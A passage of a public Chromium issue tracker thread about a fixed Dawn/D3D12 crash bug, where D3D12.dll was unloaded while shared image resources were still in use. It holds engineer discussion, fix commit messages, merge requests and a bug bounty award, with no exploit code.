method added in https://dawn-review.googlesource.com/c/dawn/+/95860

Bug: dawn:576, chromium:1338470
Change-Id: Ic481a1a91dd4fba7792bccf3a4f7559779aa098a
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3759543
Reviewed-by: Austin Eng <enga@chromium.org>
Commit-Queue: Sunny Sachanandani <sunnyps@chromium.org>
Cr-Commit-Position: refs/heads/main@{#1023851}

[modify] https://crrev.com/eefbfb4e69765eebf21fb6941ce898bcb183f7b6/gpu/command_buffer/service/shared_image_backing_d3d.cc


### su...@google.com (2022-07-15)

Reporter: can you confirm if the issue reproduces with latest canary for you?

cc Rafael from MS

### ra...@microsoft.com (2022-07-15)

FWIW, I am able to repro the bug on a build which doesn't Sunny's fixes (synced to Jul 1st) and am not able to repro on a build with Sunny's fixes. 

### ra...@microsoft.com (2022-07-15)

[D3D dev and I spent time investigating this]

FYI that DirectX internally reference counts device children. The device doesn't actually go away until all of its children go away. All D3D12 objects inherit from ID3D12DeviceChild which can return the ID3D12Device to you at any point if you call GetDevice.

The root cause of the crash in this bug is Dawn unloading D3D12.dll out from under the rest of Chromium. When the shared image code finally gets around to freeing D3D12 resources, the code that would normally run to make this happen is long gone. Hence the crash.

I believe the changes Sunny made to release ExternalImageDXGI resources when Dawn goes away are a good thing to do regardless. If the D3D device becomes removed, releasing all of the resources will cause the (now bad) user mode driver to be fully unloaded from the process. 

Since dependencies of Chromium generally take care of loading D3D in the process, we should consider leaking these LoadLibrary calls to prevent crashes like this in the future. 

### lo...@gmail.com (2022-07-15)

I just ran the same PoC ( InvalidFunPointer_~ExternalImageDXGI_PoC.html) on both stable ("103.0.5060.114 (Official Build) (64-bit) (cohort: Stable) ") and canary ("105.0.5182.0 (Official Build) canary (64-bit) (cohort: Clang-64) ").

I could reproduce it on stable channel, but I could NOT reproduce it on canary channel.

### su...@google.com (2022-07-15)

Thanks Rafael and Looben! Going to consider this fixed.

Austin/Corentin: WDYT about not ever unloading the D3D12 DLL in Dawn as suggested in https://crbug.com/chromium/1338470#c27?

### aj...@google.com (2022-07-18)

Please mark as Fixed if the CL in https://crbug.com/chromium/1338470#c24 works to start the merge request process.

### cw...@chromium.org (2022-07-18)

Thanks Rafael for the investigation!

Re: https://crbug.com/chromium/1338470#c28, that would work, I think there's at least three options to keep the D3D12 DLL loaded:

 1. Have Chromium open the D3D12 dll because it uses it in the SharedImage code.
 2. Make Dawn instances leak the D3D12 DLL (note that we'd likely need to add an option to instance creation to do that. some other users of Dawn wouldn't want that behavior).
 3. Have Chromium persistently keep a Dawn instance around that it reuses between pages. The d3d12::Backend object is kept alive by the instance and owns the D3D12.dll NativeLibrary so it would keep it loaded. We want to do this eventually anyway?

### cw...@chromium.org (2022-07-18)

Thanks Rafael for the investigation!

Re: https://crbug.com/chromium/1338470#c28, that would work, I think there's at least three options to keep the D3D12 DLL loaded:

 1. Have Chromium open the D3D12 dll because it uses it in the SharedImage code.
 2. Make Dawn instances leak the D3D12 DLL (note that we'd likely need to add an option to instance creation to do that. some other users of Dawn wouldn't want that behavior).
 3. Have Chromium persistently keep a Dawn instance around that it reuses between pages. The d3d12::Backend object is kept alive by the instance and owns the D3D12.dll NativeLibrary so it would keep it loaded. We want to do this eventually anyway?

### en...@chromium.org (2022-07-18)

I agree with (3) but (1) or (2) could be fine if we want a solution in the near term.

> I believe the changes Sunny made to release ExternalImageDXGI resources when Dawn goes away are a good thing to do regardless. If the D3D device becomes removed, releasing all of the resources will cause the (now bad) user mode driver to be fully unloaded from the process. 

Rafael - I'm not sure I understand this point. It seems to imply that the DLL is automatically unloaded when refcounts hit 0, but the fact that the crash happens when "Dawn unloading D3D12.dll out from under the rest of Chromium" implies the opposite. Does losing the device change the behavior?
Or, is the user mode driver something that D3D loads it for you as long as you have a D3D alive, and your point is more that there's no need to keep it around if the device is lost?

### ra...@microsoft.com (2022-07-20)

> It seems to imply that the DLL is automatically unloaded when refcounts hit 0

@enga, there are two different DLLs at play here: D3D12.dll and the UMD DLL. The former is a Microsoft DLL that ships with Windows. The latter is loaded by the former and is typically authored by IHVs: NVidia, AMD, Intel, QC, etc.  

LoadLibrary addrefs an internal reference count on the DLL it loads. FreeLibrary decrements the reference count. 

The root cause of the bug is that Dawn is calling LoadLibrary followed by FreeLibrary on D3D12 while there are still outstanding references to D3D12 objects it, itself, allocated on behalf of callers. We should architect Dawn such that it does not free objects out from under its consumers. Today, Chromium does not allocate D3D12 objects so it should not have to call LoadLibrary on behalf of its dependencies. If Sunny's change squashes this problem, we're good to go.  

If the device becomes removed, the UMD will be unloaded once the application frees the last D3D object. Semi-related to the root cause issue.  

### cw...@chromium.org (2022-07-20)

It makes sense that ExternalImageDXGIImpl should keep the D3D12 library loaded because it uses it until its destructor where it loses the ref to the D3D12 objects. Maybe we could turn FunctionsD3D12 (which owns the reference to the D3D12 library) into a RefCounted object and ref it from ExternalImageDXGIImpl?

### [Deleted User] (2022-07-20)

sunnyps: Uh oh! This issue still open and hasn't been updated in the last 28 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### su...@chromium.org (2022-07-20)

Just to be clear, the fixes already landed fix the issue - we don't need to change ExternalImageDXGIImpl to keep a ref on the FunctionsD3D12 since it will be destroyed when the device is.  Rafael's proposals are more about what we should do to prevent similar mishaps in the future.

ajgo: marking as Fixed based on https://crbug.com/chromium/1338470#c27 and https://crbug.com/chromium/1338470#c28.

### en...@chromium.org (2022-07-20)

[Empty comment from Monorail migration]

### [Deleted User] (2022-07-21)

[Empty comment from Monorail migration]

### [Deleted User] (2022-07-21)

[Empty comment from Monorail migration]

### [Deleted User] (2022-07-21)

Requesting merge to extended stable M102 because latest trunk commit (1023851) appears to be after extended stable branch point (992738).

Requesting merge to stable M103 because latest trunk commit (1023851) appears to be after stable branch point (1002911).

Requesting merge to beta M104 because latest trunk commit (1023851) appears to be after beta branch point (1012729).

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-07-21)

Merge review required: a commit with DEPS changes was detected.

Please answer the following questions so that we can safely process your merge request:
1. Why does your merge fit within the merge criteria for these milestones?
- Chrome Browser: https://chromiumdash.appspot.com/branches
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? https://goto.google.com/cros-engprodcomponents
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: eakpobaro (Android), harrysouders (iOS), obenedict (ChromeOS), srinivassista (Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-07-21)

Merge review required: a commit with DEPS changes was detected.

Please answer the following questions so that we can safely process your merge request:
1. Why does your merge fit within the merge criteria for these milestones?
- Chrome Browser: https://chromiumdash.appspot.com/branches
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? https://goto.google.com/cros-engprodcomponents
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: govind (Android), harrysouders (iOS), dgagnon (ChromeOS), pbommana (Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-07-21)

Merge review required: a commit with DEPS changes was detected.

Please answer the following questions so that we can safely process your merge request:
1. Why does your merge fit within the merge criteria for these milestones?
- Chrome Browser: https://chromiumdash.appspot.com/branches
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? https://goto.google.com/cros-engprodcomponents
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: eakpobaro (Android), harrysouders (iOS), ceb (ChromeOS), srinivassista (Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### am...@chromium.org (2022-07-21)

After a brief check on Canary build that included the Dawn autoroll with the two fix commits + the considerable bake time on canary the two fixes have had, I see no issues with approving merge to M104; presuming there are no issues or concerns, please merge to branch 5112 at your earliest convenience. 

While this is high severity issue, M103/stable and M102/ES respins were just released Tuesday, and there are not further planned releases of M103/stable and M102/ES; removing those merge review labels accordingly. 

### su...@google.com (2022-07-21)

Merge to M104 for the Dawn CL is tricky - a bunch of code related to fences was added since branch time. I'll try patching the fix locally, but it will require a bit more work.

### gi...@appspot.gserviceaccount.com (2022-07-21)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/61dd910ea71f667e82f5d3906e674b8f206bc370

commit 61dd910ea71f667e82f5d3906e674b8f206bc370
Author: Sunny Sachanandani <sunnyps@chromium.org>
Date: Thu Jul 21 22:14:14 2022

[m104] gpu: Cache ExternalImageDXGI per WGPUDevice for correctness

After crrev.com/c/dawn/95860, WGPUDevice destruction will invalidate
ExternalImageDXGI's internal resources so for correctness it will be
required to not reuse ExternalImageDXGI across WGPUDevices. This
happened to work due to using the same D3D12 device (from ANGLE's
default adapter) across all WGPUDevices before.

(cherry picked from commit e2955e51b69833a9b7c05bf35297b9259b94802b)

Bug: dawn:576, chromium:1338470
Change-Id: Ie576c798eff5e967a88585338fb299d63e55f0d1
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3752055
Auto-Submit: Sunny Sachanandani <sunnyps@chromium.org>
Reviewed-by: Austin Eng <enga@chromium.org>
Commit-Queue: Sunny Sachanandani <sunnyps@chromium.org>
Cr-Original-Commit-Position: refs/heads/main@{#1022972}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3781070
Bot-Commit: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com>
Cr-Commit-Position: refs/branch-heads/5112@{#1103}
Cr-Branched-From: b13d3fe7b3c47a56354ef54b221008afa754412e-refs/heads/main@{#1012729}

[modify] https://crrev.com/61dd910ea71f667e82f5d3906e674b8f206bc370/gpu/command_buffer/service/shared_image_backing_d3d.h
[modify] https://crrev.com/61dd910ea71f667e82f5d3906e674b8f206bc370/gpu/command_buffer/service/shared_image_backing_d3d.cc


### gi...@appspot.gserviceaccount.com (2022-07-22)

The following revision refers to this bug:
  https://dawn.googlesource.com/dawn/+/a92c57a8f65927f32b7c64b14461265a26e862c0

commit a92c57a8f65927f32b7c64b14461265a26e862c0
Author: Sunny Sachanandani <sunnyps@chromium.org>
Date: Fri Jul 22 21:20:16 2022

[m104] d3d12: Destroy ExternalImageDXGI resources on device destruction

D3D12 objects can have implicit dependencies on device resources that
are not captured by holding ComPtrs:

"Direct3D 12 uses COM-style reference counting only for the lifetimes of
interfaces (by using the weak reference model of Direct3D tied to the
lifetime of the device). All resource and description memory lifetimes
are the sole responsibly of the app to maintain for the proper duration,
and are not reference counted. Direct3D 11 uses reference counting to
manage the lifetimes of interface dependencies as well."

Source: https://docs.microsoft.com/en-us/windows/win32/direct3d12/important-changes-from-directx-11-to-directx-12

ExternalImageDXGI can outlive the device it was created on e.g. the D3D
shared image backing holds on to the ExternalImageDXGI for its lifetime.
ExternalImageDXGI destructor can invoke code that depends on D3D12
resources that might have already been destroyed. In particular, this
shows up as ComPtr::Release for ID3D12Fence crashing mysteriously, and
is also speculated as the cause for a racy invalid function pointer
dereference in crbug.com/1338470.

This CL makes the D3D12 backend device destroy the ExternalImageDXGI's
resources on device destruction making it effectively a weak pointer.
This unblocks landing https://crrev.com/c/3700811 and hopefully fixes
crbug.com/1338470 as well.

This CL also deprecates unnecessary WGPUDevice param to ProduceTexture,
and adds an IsValid() method so that the shared image can check it and
decide to recreate the ExternalImageDXGI if needed.

Bug: dawn:576, chromium:1338470
No-Try: true
Change-Id: I2122cf807587cf3b1218ba29ea291263df0cf698
Reviewed-on: https://dawn-review.googlesource.com/c/dawn/+/95860
Kokoro: Kokoro <noreply+kokoro@google.com>
Auto-Submit: Sunny Sachanandani <sunnyps@chromium.org>
Reviewed-by: Corentin Wallez <cwallez@chromium.org>
Commit-Queue: Corentin Wallez <cwallez@chromium.org>
(cherry picked from commit 7ae5c41412be17ea489cf20344141ec18410f5f2)
Reviewed-on: https://dawn-review.googlesource.com/c/dawn/+/96920
Reviewed-by: Austin Eng <enga@chromium.org>

[modify] https://dawn.googlesource.com/dawn/+/a92c57a8f65927f32b7c64b14461265a26e862c0/src/dawn/native/d3d12/D3D12Backend.cpp
[add] https://dawn.googlesource.com/dawn/+/a92c57a8f65927f32b7c64b14461265a26e862c0/src/dawn/native/d3d12/ExternalImageDXGIImpl.cpp
[modify] https://dawn.googlesource.com/dawn/+/a92c57a8f65927f32b7c64b14461265a26e862c0/src/dawn/native/d3d12/D3D11on12Util.h
[modify] https://dawn.googlesource.com/dawn/+/a92c57a8f65927f32b7c64b14461265a26e862c0/src/dawn/tests/end2end/D3D12ResourceWrappingTests.cpp
[modify] https://dawn.googlesource.com/dawn/+/a92c57a8f65927f32b7c64b14461265a26e862c0/src/dawn/native/d3d12/DeviceD3D12.cpp
[modify] https://dawn.googlesource.com/dawn/+/a92c57a8f65927f32b7c64b14461265a26e862c0/include/dawn/native/D3D12Backend.h
[modify] https://dawn.googlesource.com/dawn/+/a92c57a8f65927f32b7c64b14461265a26e862c0/src/dawn/native/CMakeLists.txt
[modify] https://dawn.googlesource.com/dawn/+/a92c57a8f65927f32b7c64b14461265a26e862c0/src/dawn/native/d3d12/D3D11on12Util.cpp
[add] https://dawn.googlesource.com/dawn/+/a92c57a8f65927f32b7c64b14461265a26e862c0/src/dawn/native/d3d12/ExternalImageDXGIImpl.h
[modify] https://dawn.googlesource.com/dawn/+/a92c57a8f65927f32b7c64b14461265a26e862c0/src/dawn/native/BUILD.gn
[modify] https://dawn.googlesource.com/dawn/+/a92c57a8f65927f32b7c64b14461265a26e862c0/src/dawn/native/d3d12/DeviceD3D12.h


### am...@google.com (2022-07-28)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@google.com (2022-07-28)

Congratulations, Looben Yang! The VRP Panel has decided to award you $7,000 for this report. Thank you for your efforts and reporting this issue to us - nice work! 

### am...@google.com (2022-07-29)

[Empty comment from Monorail migration]

### am...@chromium.org (2022-08-01)

From an offbug conversation with sunnyps@, commit is for strictly for performance optimization, and should be backmerged to M104. This backmerge will occur today and while it will not be included in the M104 stable release tomorrow, this issue is considered resolved from a security standpoint in M104 stable. 

### gi...@appspot.gserviceaccount.com (2022-08-01)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/e85f295e498ffe6b7066b908faf27c8018b30a94

commit e85f295e498ffe6b7066b908faf27c8018b30a94
Author: Sunny Sachanandani <sunnyps@chromium.org>
Date: Mon Aug 01 21:59:00 2022

[m104] gpu: Evict invalid Dawn DXGI external images

After https://crrev.com/c/3752055, Dawn DXGI external images are keyed
on the WGPUDevice that created them. This CL keeps the external image
map from growing unbounded by evicting invalid images based on IsValid()
method added in https://dawn-review.googlesource.com/c/dawn/+/95860

(cherry picked from commit 631f4771509e93d6b6a748e84651b52bab4f94ec)

Bug: dawn:576, chromium:1338470
Change-Id: Ic481a1a91dd4fba7792bccf3a4f7559779aa098a
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3759543
Reviewed-by: Austin Eng <enga@chromium.org>
Commit-Queue: Sunny Sachanandani <sunnyps@chromium.org>
Cr-Original-Commit-Position: refs/heads/main@{#1023851}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3795692
Auto-Submit: Sunny Sachanandani <sunnyps@chromium.org>
Commit-Queue: Austin Eng <enga@chromium.org>
Cr-Commit-Position: refs/branch-heads/5112@{#1335}
Cr-Branched-From: b13d3fe7b3c47a56354ef54b221008afa754412e-refs/heads/main@{#1012729}

[modify] https://crrev.com/e85f295e498ffe6b7066b908faf27c8018b30a94/gpu/command_buffer/service/shared_image_backing_d3d.cc


### am...@google.com (2022-08-02)

[Empty comment from Monorail migration]

### am...@google.com (2022-08-12)

[Empty comment from Monorail migration]

### am...@chromium.org (2022-08-12)

[Empty comment from Monorail migration]

### [Deleted User] (2022-10-27)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1338470?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail blocking: crbug.com/dawn/1499]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40060042)*
